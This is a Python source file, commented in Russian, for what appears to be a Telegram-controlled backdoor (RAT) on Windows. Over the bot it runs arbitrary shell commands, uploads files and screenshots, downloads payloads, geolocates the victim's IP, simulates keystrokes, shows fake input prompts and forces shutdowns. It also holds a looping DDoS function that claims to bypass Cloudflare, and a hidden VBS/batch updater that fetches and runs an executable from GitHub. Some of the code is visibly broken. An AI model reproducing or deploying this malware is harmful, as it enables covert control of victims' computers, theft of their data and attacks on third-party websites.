# -*- coding: utf8 -*-
import os
import platform
import subprocess
import threading
import requests
import pyautogui
import keyboard
import telebot
import json as jsn
import datetime
import argparse
import ctypes
import platform

# Чтение данных из конфигурационного файла
with open("config.json", 'r', encoding='utf-8') as f:
    data = jsn.load(f)

# Получение данных из конфигурационных данных
white_list_id = data["white_list"]
info = data["info"]
update = data["update"]
name_pc = data["name_pc"]
bot_token = data["bot_token"]

# Создание директории media, если она не существует
if not os.path.isdir('media'):
    os.mkdir('media')

# Удаление файлов upd.vbs и upd.bat, если необходимо обновить скрипт
if update == 1:
    try:
        os.remove('upd.vbs')
        os.remove('upd.bat')
    except OSError:
        pass
    exit()

# Создание экземпляра бота
bot = telebot.TeleBot(bot_token)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


class Func_API:
    def __init__(self) -> None:
        for ids in id:
            try:
                if is_admin():
                    bot.send_message(ids, f'{name_pc} запущен от имени администратора')
                else:
                    bot.send_message(ids, f'{name_pc} запущен от имени обычного пользователя')
            except Exception:
                pyautogui.alert("Вы указали неверный токен")

    def rasbiv(text):
        # Создание парсера аргументов
        parser = argparse.ArgumentParser()
        # Добавление обязательного аргумента name
        parser.add_argument("name", type=str, help="Имя функции")
        # Добавление обязательного аргумента cmnd
        parser.add_argument("cmnd", type=str, help="Команда функции")
        # Добавление необязательных аргументов text
        parser.add_argument("text", type=str, nargs="*", help="Текст функции")

        # Парсинг аргументов из текста
        args = parser.parse_args(text.split())

        return {"name": args.name,
                "cmnd": args.cmnd,
                "text": args.text}

    def cmdo_ret(com):
        """
        Выполнение команды и возврат результата
        """
        try:
            # Выполнение команды
            result = subprocess.check_output(com, shell=True)
        except Exception:
            return 'Ошибка'

        try:
            # Декодирование байтовой строки в строку utf-8
            result = result.decode('utf-8')
        except Exception:
            try:
                # Декодирование байтовой строки в строку cp866
                result = result.decode('cp866')
            except Exception:
                return 'Ошибка'

        return '🖥✅:\n' + result

    def cmdo(white_list_id, com, bot):
        """
        Выполнение команды
        """
        try:
            # Выполнение команды
            result = subprocess.check_output(com, shell=True)
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')
            return

        try:
            # Декодирование байтовой строки в строку utf-8
            result = result.decode('utf-8')
        except Exception:
            try:
                # Декодирование байтовой строки в строку cp866
                result = result.decode('cp866')
            except Exception:
                bot.send_message(white_list_id, 'Ошибка')
                return

        # Отправка результата выполнения команды
        bot.send_message(white_list_id, '🖥✅:\n' + result)

    def cmdi(white_list_id, com, bot):
        """
        Выполнение команды
        """
        try:
            # Выполнение команды
            os.system(com)
            bot.send_message(white_list_id, "🖥✅")
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')

    def exits(white_list_id, bot):
        dir = os.listdir("media/")
        for i in dir:
            os.remove("media/" + i)
        bot.send_message(white_list_id, "🖥✅")

    def ip_address(white_list_id, bot):
        """
        Получение информации об IP-адресе
        """
        try:
            # Получение IP-адреса через jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # Получение информации об IP-адресе через ip-api.com
            response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # Создание словаря с информацией об IP-адресе
            data = {
                '[IP]': response.get('query'),
                '[Провайдер]': response.get('isp'),
                '[Организация]': response.get('org'),
                '[Страна]': response.get('country'),
                '[Регион]': response.get('regionName'),
                '[Город]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Широта]': response.get('lat'),
                '[Долгота]': response.get('lon'),
            }

            # Формирование строки с информацией об IP-адресе
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # Отправка строки с информацией об IP-адресе
            bot.send_message(white_list_id, info_string)
        except requests.exceptions.ConnectionError:
            bot.send_message(white_list_id, 'Ошибка соединения')

    def wgt(white_list_id, text_comand, bot):
        """
        Загрузка файла с указанного URL
        """
        try:
            # Загрузка файла с указанного URL через библиотеку requests
            file = requests.get(text_comand[0])
            # Сохранение файла в указанное место
            with open(text_comand[1], 'wb') as f:
                f.write(file.content)
            bot.send_message(white_list_id, "🖥✅")
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')

    def rebooting(white_list_id, timer, bot):
        """
        Перезагрузка компьютера через указанный интервал времени
        """
        try:
            # Формирование команды на перезагрузку компьютера
            timer = "shutdown /r /t " + str(timer)
            os.system(timer)
            bot.send_message(white_list_id, "🖥✅")
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')

    def shutdowning(white_list_id, timer, bot):
        """
        Выключение компьютера через указанный интервал времени
        """
        try:
            # Формирование команды на выключение компьютера
            timer = "shutdown /s /t " + str(timer)
            os.system(timer)
            bot.send_message(white_list_id, "🖥✅")
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')

    def picture(white_list_id, file, bot):
        """
        Открытие файла с указанным именем
        """
        try:
            # Формирование пути к файлу
            command = f"media\\{file}.png"
            # Открытие файла
            os.startfile(command)
            bot.send_message(white_list_id, "🖥✅")
            # Удаление файла
            os.remove(command)
        except Exception as e:
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def video(white_list_id, file, bot):
        """
        Открытие файла с указанным именем
        """
        try:
            # Формирование пути к файлу
            command = f"media\\{file}.mp4"
            # Открытие файла
            os.startfile(command)
            bot.send_message(white_list_id, "Видео успешно открыто")
            # Удаление файла
            os.remove(command)
        except Exception as e:
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def specifications(self, white_list_id, bot):
        """
        Получение спецификаций компьютера
        """
        x, y = pyautogui.size()
        banner = f"""Имя ПК:   {platform.node()}\n
        ОС: {platform.system()} {platform.release()}\n
        Разрядность: {platform.architecture()[0]}\n
        CPU: {platform.processor()}\n
        GPU: {os.popen("lspci | grep -i vga").read().split(":")[2].strip()}\n
        RAM: {os.popen('free -m').readlines()[1].split()[1] + " MB"}\n
        Разрешение: {x}x{y}"""
        bot.send_message(white_list_id, banner)

    def rask(white_list_id, bot):
        try:
            keyboard.press_and_release("alt+shift")
            bot.send_message(white_list_id, "Раскладка успешно изменена")
        except Exception as e:
            bot.send_message(white_list_id, f"Ошибка: {e}")

    def screenshot(white_list_id, bot):
        # Формируем имя файла с текущей датой и временем в формате YYYY-MM-DD HH-MM-SS
        filename = f"screenshot_{datetime.datetime.now(datetime.timezone(datetime.timedelta(hours=3))).strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"

        # Создаем скриншот экрана и сохраняем его в указанном файле
        pyautogui.screenshot(filename)

        # Открываем файл в бинарном режиме и отправляем
        img = open(filename, "rb")
        bot.send_document(white_list_id, img)
        img.close()
        # Удаляем файл
        os.remove(filename)

    def keyb(white_list_id, text, bot):
        # Преобразуем строку в список, разделив ее по символу "+"
        try:
            text = text.split("+")
            # Объявим пустую строку для хранения составных клавиш, которые будем нажимать
            listing = ""

            # Объявим список с клавишами, которые можно нажимать через keyboard.press_and_release
            button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"]

            # Перебираем элементы списка text
            for i in text:
                try:
                    # Если i является составной клавишей (например, shift, alt), то добавляем ее в строку listing
                    index = button.index(i)
                    listing += i + "+"
                except:
                    for kip in i:
                        listing += kip + "+"
                listing = listing[:-1].replace(' ', 'space')
                keyboard.press_and_release(listing)
                bot.send_message(white_list_id, "Успешно выполнено")
        except Exception as e:
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def print_gui(white_list_id, text, bot):
        try:
            # Показываем модальное окно с текстом text
            pyautogui.alert(text, "~")
            # Отправляем сообщение об успешном выполнении
            bot.send_message(white_list_id, 'Окно с текстом отображено успешно')
        except Exception as e:
            # Отправляем сообщение об ошибке
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def input_gui(white_list_id, text, bot):
        try:
            # Показываем диалоговое окно с запросом ввода
            answer = pyautogui.prompt(text, "~")
            # Отправляем ответ в чат
            bot.send_message(white_list_id, answer)
        except Exception as e:
            # В случае ошибки отправляем сообщение об ошибке
            bot.send_message(white_list_id, 'Ошибка: {}'.format(e))

    def closes(white_list_id, bot):
        # Пытаемся закрыть текущее окно с помощью сочетания клавиш Alt+F4
        try:
            keyboard.press_and_release("alt+f4")
            # Отправляем сообщение об успешном закрытии окна
            bot.send_message(white_list_id, 'Окно успешно закрыто')
        except Exception as e:
            # В случае неудачи отправляем сообщение об ошибке
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def start_file(white_list_id, path, bot):
        """
        Открывает файл по указанному пути.
        В случае успеха отправляет сообщение 'Файл успешно запущен',
        в случае ошибки 'Ошибка: файл не найден' или 'Ошибка: неизвестная ошибка'
        """
        try:
            os.startfile(f"media/{path}")
            bot.send_message(white_list_id, 'Файл успешно запущен')
        except FileNotFoundError:
            bot.send_message(white_list_id, 'Ошибка: файл не найден')
        except:
            bot.send_message(white_list_id, 'Ошибка: неизвестная ошибка')

    def direct(white_list_id, paths, bot):
        try:
            if paths == ".":
                paths = os.getcwd()
            exit_str = ""
            exit_str += f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str += i + "\n"
            for i in dirs:
                try:
                    o = os.listdir(paths + "/" + i)
                    exit_str += "|" + i + "\n"
                    for l in o:
                        exit_str += "| - " + l + "\n"
                    exit_str += "\n"
                except:
                    pass
            bot.send_message(white_list_id, exit_str)
        except:
            bot.send_message(white_list_id, 'Ошибка')

    def update_bot(bot, bot_token, name_pc):
        pth = os.getcwd()
        text_bat = f'''@echo off
    timeout 30
    del {pth}\\windows_shell.exe powershell -Command "Invoke-WebRequest 
    https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe" start 
    windows_shell.exe -n {bot_token} -t {name_pc} -u 1 
    exit'''

        text_vbs = f'''
    set sh=CreateObject("Wscript.Shell")
    sh.Run "{pth}\\upd.bat", 0'''

        open('upd.bat', 'w').write(text_bat)
        open('upd.vbs', 'w').write(text_vbs)
        os.startfile('upd.vbs')
        bot.stop_polling()

    def ddos(bot, white_list_id, url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            bot.send_message(white_list_id, f'DDOS атака на {url} успешно запущена')
        else:
            bot.send_message(white_list_id, f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers, allow_redirects=True, stream=True)
            except Exception:
                pass

    def pull_file(bot, white_list_id: int, path: str):
        path = path.replace('\\', '/')  # Замена символа "\" на "/"
        if os.path.exists(path):  # Проверка существования файла
            file = open(path, 'rb')
            bot.send_document(white_list_id, file)
        else:
            # Создание сообщения об ошибке с информацией о текущем каталоге
            path = path.split('/')
            if len(path) <= 1:
                otv = f"Ошибка File not found \n|{os.getcwd()}\n|--  " + '\n|--  '.join(os.listdir(os.getcwd()))
            else:
                pr = '/'.join(path[:-1])
                otv = f"Ошибка File not found \n|{pr}\n|--  " + '\n|--  '.join(os.listdir(pr))
                bot.send_message(white_list_id, otv)

    def browser(bot, white_list_id, link: str):
        """
        Открывает ссылку в браузере
        """
        try:
            linke = f'start {link}'
            os.system(linke)
            bot.send_message(white_list_id, 'Ссылка успешно открыта')
        except Exception as e:
            bot.send_message(white_list_id, f'Ошибка: {e}')

    def perfor(white_list_id, bot, self, text, id_chat):
        white_list_id = id_chat
        text = self.rasbiv(text)
        name_pc = text["name"]
        comnd = text["cmnd"]
        text_comand = text["text"]

        if name_pc.lower() == name_pc or name_pc.lower() == "all":
            if comnd == "wget":
                threading.Thread(target=self.wgt, args=(text_comand,)).start()

            if comnd == "ip" or comnd == "ipad":
                threading.Thread(target=self.ip_address).start()

            if comnd == "reboot":
                threading.Thread(target=self.rebooting, args=(text_comand[0],)).start()

            if comnd == "specifications" or comnd == "spec":
                threading.Thread(target=self.specifications).start()

            if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
                threading.Thread(target=self.shutdowning, args=(text_comand[0],)).start()

            if comnd == "picture" or comnd == "pict" or comnd == "pic":
                threading.Thread(target=self.picture, args=(text_comand[0],)).start()

            if comnd == "cmdi":
                threading.Thread(target=self.cmdi, args=(text_comand[0],)).start()

            if comnd == "cmdo":
                threading.Thread(target=self.cmdo, args=(text_comand[0],)).start()

            if comnd == "video" or comnd == "vide" or comnd == "vid":
                threading.Thread(target=self.video, args=(text_comand[0],)).start()

            if comnd == "exit" or comnd == "cls" or comnd == "clear":
                threading.Thread(target=self.exits).start()

            if comnd == "lock" or comnd == "close":
                threading.Thread(target=self.closes).start()

            if comnd == "keyb" or comnd == "keyboard":
                threading.Thread(target=self.keyb, args=(text_comand[0],)).start()

            if comnd == "rask" or comnd == "layout":
                threading.Thread(target=self.rask).start()

            if comnd == "dir" or comnd == "direction":
                threading.Thread(target=self.direct, args=(text_comand[0],)).start()

            if comnd == "screenshot" or comnd == "scrn":
                threading.Thread(target=self.screenshot).start()

            if comnd == "inpt" or comnd == "input":
                threading.Thread(target=self.input_gui, args=(text_comand[0],)).start()

            if comnd == "outp" or comnd == "output":
                threading.Thread(target=self.print_gui, args=(text_comand[0],)).start()

            if comnd == "start" or comnd == "strt":
                threading.Thread(target=self.start_file, args=(text_comand[0],)).start()

            if comnd == "ddos" or comnd == "attack_while" or comnd == "sitekill":
                try:
                    for cores in text_comand[1]:
                        threading.Thread(target=self.ddos, args=(text_comand[0],)).start()
                except Exception as e:
                    bot.send_message(white_list_id, f'Ошибка: {e}')

            if comnd == "browser" or comnd == "brws":
                threading.Thread(target=self.browser, args=(text_comand[0],)).start()

            if comnd == "pull" or comnd == "pull_file":
                threading.Thread(target=self.pull_file, args=(text_comand[0],)).start()

            if comnd == "kill":
                self.exits()
                bot.stop_polling()

            if comnd == "upd":
                self.update_bot()


func_api = Func_API()


@bot.message_handler(commands=['info', 'start'])
def start_message(message):
    if message.chat.id in id:
        bot.send_message(message.chat.id, f"Список функций: \n{info}")


@bot.message_handler(content_types=['text'])
def infokigb(message):
    if message.chat.id in id:
        func_api.perfor(message.text, message.chat.id)


@bot.message_handler(content_types=['photo'])
def handle_docs_document(message):
    if message.chat.id in id:
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = 'media/' + message.photo[1].file_id
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        picu = func_api.ren(message.photo[1].file_id, "pic")
        bot.reply_to(message, f"OK. Сохранил как {picu} по пути {src}")


@bot.message_handler(content_types=['video'])
def get_file(message):
    if message.chat.id in id:
        print(message.json)
        file_name = 'media/' + message.json['video']['file_id']
        file_info = bot.get_file(message.video.file_id)
        with open(file_name, "wb") as f:
            file_content = bot.download_file(file_info.file_path)
            f.write(file_content)
        video = func_api.ren(file_name[5:], "vid")
        bot.reply_to(message, f"OK. Сохранил как {video} по пути {file_name}")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.chat.id in id:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = 'media/' + message.document.file_name
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message, f"Файл успешно скачан и сохранен по пути {src}")
        except Exception as e:
            bot.reply_to(message, f"Ошибка: {e}")


bot.infinity_polling()
